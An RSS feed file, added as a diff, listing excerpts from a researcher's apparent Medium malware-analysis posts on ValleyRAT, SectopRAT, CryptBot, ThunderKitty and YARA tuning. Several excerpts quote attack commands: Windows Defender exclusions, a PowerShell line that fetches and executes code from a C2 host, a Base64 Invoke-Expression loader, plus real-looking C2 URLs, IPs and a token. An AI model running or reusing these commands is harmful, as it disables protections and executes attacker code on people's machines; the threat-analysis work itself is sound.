@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+<channel>
+  <title>Apophis133 on Medium (Custom Feed)</title>
+  <link>https://apophis133.medium.com/</link>
+  <description>Auto-generated every 2 hours</description>
+  <lastBuildDate>Fri, 20 Feb 2026 17:01:54 GMT</lastBuildDate>
+  <item>
+    <title>ValleyRAT_S2 Chinese campaign</title>
+    <link>https://apophis133.medium.com/valleyrat-s2-chinese-campaign-4504b890f416?source=rss-3dbcfa4be36e------2</link>
+    <description>ValleyRAT_S2 represents the second-stage payload of the ValleyRAT malware family, a sophisticated Remote Access Trojan (RAT) written in C++. This modular and stealthy malware has been actively used in cyber-espionage and financially motivated campaigns, primarily targeting Chinese-speaking regions, including mainland China, Hong Kong, Taiwan, and Southeast Asia. The S2 payload serves as the functional core of the malware, activated after successful initial infection. While Stage 1 handles infiltration and evasion, Stage 2 implements the primary backdoor capabilities, command and control communications, persistence mechanisms, and comprehensive system reconnaissance. Distribution Methods 1. Fake Software Installers ValleyRAT commonly disguises itself within: Fake productivity tools (e.g., “AI表格生成工具” — AI-based spreadsheet generator) Cracked or unofficial software downloads Legitimate-looking Chinese-language utilities 2. DLL Side-Loading A primary and sophisticated delivery mechanism: L</description>
+    <pubDate>Sun, 11 Jan 2026 17:23:39 GMT</pubDate>
+  </item>
+  <item>
+    <title>PowerShell loads SectopRAT &amp; HijackLoader</title>
+    <link>https://apophis133.medium.com/powershell-loads-sectoprat-hijack-loader-c6f723de080b?source=rss-3dbcfa4be36e------2</link>
+    <description>Executive Summary During routine malware analysis, I discovered a PowerShell-based dropper script being delivered from a malicious C2 domain: URL : https://fancysunshine[.]top/s8dj3bh9w877/Add.ps1 SHA-256 : cb7dee0f26cc30b13e5775877d570fcd4ca2e4f1a89614cc12031d6070b78473 This script disables security controls, fetches 2 payloads(SectopRAT, HiJack Loader), exfiltrates data, and removes all traces of its execution. Full Behavioral Breakdown Step 1: Disables Windows Defender Protections The script attempts to evade detection by creating Windows Defender exclusions for the entire C drive and two known processes often abused in malware campaigns. $folderPath = "C:\" $processName = "MicrosoftEdgeUpdate.exe" $processName1 = "SecurityHealthSystray.exe" Add-MpPreference -ExclusionPath $folderPath Add-MpPreference -ExclusionProcess $processName Add-MpPreference -ExclusionProcess $processName1 Step 2: Downloads and Executes Malicious Payloads The script uses Invoke-WebRequest to pull two ZIP arch</description>
+    <pubDate>Sun, 22 Jun 2025 21:15:28 GMT</pubDate>
+  </item>
+  <item>
+    <title>PowerShell Script — Tactical RMM Installation</title>
+    <link>https://apophis133.medium.com/powershell-script-tactical-rmm-installation-45afb639eff3?source=rss-3dbcfa4be36e------2</link>
+    <description>PowerShell Script — Tactical RMM Installation Executive Summary A PowerShell script has been identified with characteristics consistent with malicious remote access tool (RAT) deployment. The script, found at a suspicious URL with zero antivirus detection, installs Tactical RMM software configured to connect to an unauthorized command and control server. sha256:7803e77ef9fa54ad393fb2732f878e449529be18809ab5311bd5e3ff2bb1299c Threat Intelligence Source Attribution Distribution URL : http://185.156.72.2/files/1870541102/wjxORnY.ps1 IP Geolocation : 185.156.72.2 Detection Rate : 0/70 on VirusTotal Attribution : Script claims authorship by “bradhawkins85” on GitHub Command and Control Infrastructure C2 Server : api.tinyastro.click Protocol : HTTPS (Port 443) Authentication : Hardcoded token a0809da5b2c576299df8adf86287e67469e3ab4098ecb4815e93f532f73055cf Technical Analysis Payload Characteristics Installation Vector Legitimate Source: github.com/amidaware/rmmagent/releases/download/v2.9.1/</description>
+    <pubDate>Wed, 21 May 2025 21:53:53 GMT</pubDate>
+  </item>
+  <item>
+    <title>Blacked-E Hacking Tool and NUSO Stealer</title>
+    <link>https://apophis133.medium.com/blacked-e-hacking-tool-and-nuso-stealer-10906f3c1b4f?source=rss-3dbcfa4be36e------2</link>
+    <description>I have identified a hacking tool as “Blacked-E,” which serves as the initial access mechanism for deploying many NUSO stealer payloads. Blacked-E Sample - SHA-256: e2aef88dd7c7eaf85319f9d99ed0e95598d356d4549a6f73dba6a62c77487937 - Reference: https://www.virustotal.com/gui/file/e2aef88dd7c7eaf85319f9d99ed0e95598d356d4549a6f73dba6a62c77487937/detection C2 Server: 52.111.243.30:443 Payload Analysis: The initial Blacked-E payload acts as a dropper, delivering a total of 64 NUSO stealer samples. These secondary payloads are currently undetected by common security solutions. I have identified these samples as NUSO stealer through my internal YARA rules NUSO Stealer Capabilities - Stored browser credentials - Cryptocurrency wallets - System information - Document files - Screenshots - 2FA/MFA backup codes nuso_iocs: 0b3b84fbb6d60b942d9b92ac868a444714605e5372c6ef4fbb7ee505e2858b8e 0db8ba39404d288e986c04560d2c4d3f9ffa5364f0de2ca2a86b01dd986efb95 0f4b70fa2713bf5c1ef6104da9f309d90655848c0f6d30158</description>
+    <pubDate>Sun, 27 Apr 2025 21:57:54 GMT</pubDate>
+  </item>
+  <item>
+    <title>CryptBot v3 PowerShell</title>
+    <link>https://apophis133.medium.com/cryptbot-v3-powershell-5ab805ca8b4a?source=rss-3dbcfa4be36e------2</link>
+    <description>During analysis, CryptBot v3 was observed executing the following PowerShell command to contact its command-and-control (C2) server and retrieve additional payloads: powershell -NoP -NonI -ExecutionPolicy Bypass -C " $Resp = Invoke-WebRequest -Uri  'hxxps[://]keruzam[.]com/update[.]php?compName=' + $env:computername ` -UseBasicParsing -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ` (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'; $Scr = [System.Text.Encoding]::UTF8.GetString($Resp.Content); IEX $Scr " Breakdown of the Execution Flow PowerShell Execution with Security Bypass -NoP (No Profile) → Prevents loading user PowerShell profiles. -NonI (Non-Interactive) → Runs without requiring user input. -ExecutionPolicy Bypass → Ignores PowerShell script execution restrictions. 2. Network Communication with the C2 Server Uses Invoke-WebRequest to retrieve additional commands from: 🔗 https://keruzam.com/update.php?compName=$env:computername Sends the infected mach</description>
+    <pubDate>Mon, 24 Mar 2025 22:23:48 GMT</pubDate>
+  </item>
+  <item>
+    <title>Harvester APT</title>
+    <link>https://apophis133.medium.com/harvester-apt-4f63a21d2e24?source=rss-3dbcfa4be36e------2</link>
+    <description>Sectors Targeted : Utilities Finance &amp; Insurance Healthcare &amp; Social Assistance Public Administration Telecommunications National Security Geographic Focus : Ukraine South Asia Afghanistan U.S. Virgin Islands Hong Kong Associated Groups : Harvester shares overlap in tactics with APT29 (Russia-linked), APT41 (China-linked), and Sandworm (Russia-linked), suggesting possible collaboration or inspiration from established state-sponsored actors. Key Features and Attack Lifecycle Harvester employs a multi-phase approach aligned with the MITRE ATT&amp;CK framework : 1. Resource Development T1608 : Establish fake accounts for phishing infrastructure. T1585 : Acquire infrastructure (e.g., domains mimicking legitimate organizations). 2. Initial Access T1078 : Exploit valid credentials (e.g., compromised RDP logins). T1566 : Spear-phishing emails with malicious attachments (e.g., fake invoices, COVID-19 lures). 3. Execution &amp; Persistence T1059 : PowerShell scripts for payload deployment. T1078 : Main</description>
+    <pubDate>Sun, 23 Feb 2025 03:16:16 GMT</pubDate>
+  </item>
+  <item>
+    <title>Malicious PowerShell Analysis</title>
+    <link>https://apophis133.medium.com/malicious-powershell-analysis-693611db3795?source=rss-3dbcfa4be36e------2</link>
+    <description>Introduction During an investigation in the wild, I discovered a PowerShell script in the URL pattern hxxp[://]185[.]215[.]113[.]97/files/anon/GeneratedInstaller[.]ps1. This report details the analysis of the script’s functionality, which employs Base64 obfuscation and dynamic execution. Script Structure The PowerShell script contains two primary stages: Bypass and Decoding Stage: Execution Policy Bypass: Set-ExecutionPolicy Bypass -Scope Process -Force This command bypasses the local execution policy, ensuring the script can run even on systems with restrictive settings. Base64 Decoding and Dynamic Execution: $encoded = "encoded long code inside" $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded)) Invoke-Expression $decoded The script stores an encoded string in $encoded, decodes it from Base64 using Unicode (UTF-16 little-endian) encoding, and then executes the decoded content using Invoke-Expression. Decoded Content Analysis After decod</description>
+    <pubDate>Mon, 17 Feb 2025 13:35:15 GMT</pubDate>
+  </item>
+  <item>
+    <title>Malicious PowerShell Script Execution</title>
+    <link>https://apophis133.medium.com/malicious-powershell-script-execution-d90b93f44b48?source=rss-3dbcfa4be36e------2</link>
+    <description>Overview: The user encounters a malicious link disguised as a system fix. Upon clicking the “How to Fix” button, the user is prompted to run an encoded PowerShell script via the clipboard. The script employs multiple malicious techniques, such as DNS cache clearing, scheduled jobs for persistence, remote code execution, and clipboard manipulation. Infection Process: 1. User Interaction: Prompt to Fix Issue: The user can click a “How to Fix” button. Copying Malicious PowerShell Script: The button copies an encoded PowerShell script to the clipboard, instructing the user to paste and execute it in PowerShell. 2.PowerShell Execution: The PowerShell script is obfuscated using Base64 encoding, and the user is tricked into running it. After decoding the script, the following actions are taken Script Breakdown and Analysis: 1. DNS Cache Manipulation: ipconfig/flushdns Effect: Clears the DNS cache, which might help remove evidence of previous malicious activities or redirect traffic. 2. Schedu</description>
+    <pubDate>Mon, 14 Oct 2024 17:43:11 GMT</pubDate>
+  </item>
+  <item>
+    <title>Enhancing YARA Rule Performance: Best Practices and Techniques</title>
+    <link>https://apophis133.medium.com/enhancing-yara-rule-performance-best-practices-and-techniques-e8dc57cf84ee?source=rss-3dbcfa4be36e------2</link>
+    <description>YARA is a powerful tool for identifying and classifying malware based on patterns and signatures within files. However, as the complexity of malware evolves, so must the efficiency and effectiveness of YARA rules. This report outlines key strategies for optimizing YARA rule performance, focusing on leveraging specific constructs and techniques. 1. Leverage Header Checks Header checks are one of the most efficient ways to filter out irrelevant files early in the scanning process. By examining the initial bytes of a file, you can quickly determine if the file matches the expected format. EXE Files: exe &gt;&gt; uint16(0) == 0x5A4D The above condition checks if the first two bytes of a file match the “MZ” signature, a standard for DOS headers in executable files. JPEG Files: jpg &gt;&gt; uint16(0) == 0xFFD8 and uint8(2) == 0xFF This condition identifies JPEG files by checking for the “FFD8” marker at the start and ensuring the next byte is “FF”. PDF Files: pdf &gt;&gt; uint32be(0) == 0x25504446 PDF files b</description>
+    <pubDate>Sun, 22 Sep 2024 21:13:35 GMT</pubDate>
+  </item>
+  <item>
+    <title>ThunderKitty stealer</title>
+    <link>https://apophis133.medium.com/thunderkitty-stealer-57782a2bb333?source=rss-3dbcfa4be36e------2</link>
+    <description>The info stealer script is designed to collect various types of system information, disable security features, and exfiltrate collected data. Here’s a breakdown of how it works: Initial Command Execution Launch Command Prompt and Execute Batch Script: "C:\\Windows\\system32\\cmd.exe" /c "cd ^"C:\\Users\\&lt;USER&gt;\\AppData\\Local\\Temp^" &amp;&amp; start /wait ^"^" ^"C:\\Users\\&lt;USER&gt;\\AppData\\Local\\Temp\\ThunderKitty-main/main.bat^" This command opens cmd.exe, changes to the Temp directory, and runs the batch script main.bat. main.bat Script Install Required Go Packages: @Echo off go get golang.org/x/crypto/pbkdf2 go get modernc.org/sqlite go get github.com/shirou/gopsutil/disk go get github.com/EvilBytecode/GoDefender pause Downloads necessary Go packages for the script. PowerShell Script Execution Execute PowerShell Script: "C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe" -NoProfile -ExecutionPolicy bypass -File "C:\\Users\\&lt;USER&gt;\\AppData\\Local\\Temp\\ThunderKitty-main/powe</description>
+    <pubDate>Thu, 27 Jun 2024 10:57:57 GMT</pubDate>
+  </item>
+</channel>
+</rss>
